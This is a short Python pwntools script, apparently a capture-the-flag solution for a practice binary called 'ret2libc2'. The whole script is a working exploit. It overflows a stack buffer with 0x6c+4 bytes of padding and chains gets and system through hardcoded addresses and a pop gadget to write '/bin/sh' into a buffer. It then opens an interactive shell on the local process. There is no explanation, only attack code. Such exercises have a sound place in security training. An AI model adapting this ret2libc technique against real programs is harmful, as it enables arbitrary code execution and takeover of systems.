from pwn import *

offset = 0x6c + 4
system_addr = 0x08048490
gets_addr = 0x08048460
buf_addr = 0x0804a100
pop_addr = 0x0804872f

payload = offset * b'A' \
        + p32(gets_addr) \
        + p32(pop_addr) + p32(buf_addr) \
        + p32(system_addr) + p32(0xAAAAAAAA) + p32(buf_addr)

sh = process("./ret2libc2")
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
